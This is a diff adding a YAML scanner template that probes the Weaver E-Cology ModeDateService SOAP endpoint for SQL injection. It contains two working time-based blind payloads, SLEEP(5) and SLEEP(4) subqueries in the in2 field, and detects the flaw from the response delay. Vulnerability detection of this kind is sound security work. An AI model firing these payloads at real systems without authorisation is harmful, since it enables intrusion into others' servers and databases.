@@ -1,0 +1,43 @@
+name: 泛微E-Cology-ModeDateService-SQL注入
+description: >
+  SQL注入
+alwaysExecute: false
+timeout: 8
+matchCount: 2
+rules:
+  - method: POST
+    path: /services/ModeDateService
+    headers:
+      Content-Type: text/xml
+    body: |
+        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:mod="http://localhost/services/ModeDateService">
+           <soapenv:Header/>
+           <soapenv:Body>
+              <mod:getAllModeDataCount>
+                 <mod:in0>1</mod:in0>
+                 <mod:in1>1</mod:in1>
+                 <mod:in2>(SELECT 8544 FROM (SELECT(SLEEP(5)))NZeo)</mod:in2>
+                 <mod:in3>1</mod:in3>
+              </mod:getAllModeDataCount>
+           </soapenv:Body>
+        </soapenv:Envelope>
+    expression:
+      sleep: 5
+  - method: POST
+    path: /services/ModeDateService
+    headers:
+      Content-Type: text/xml
+    body: |
+        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:mod="http://localhost/services/ModeDateService">
+           <soapenv:Header/>
+           <soapenv:Body>
+              <mod:getAllModeDataCount>
+                 <mod:in0>1</mod:in0>
+                 <mod:in1>1</mod:in1>
+                 <mod:in2>(SELECT 8544 FROM (SELECT(SLEEP(4)))NZeo)</mod:in2>
+                 <mod:in3>1</mod:in3>
+              </mod:getAllModeDataCount>
+           </soapenv:Body>
+        </soapenv:Envelope>
+    expression:
+      sleep: 4
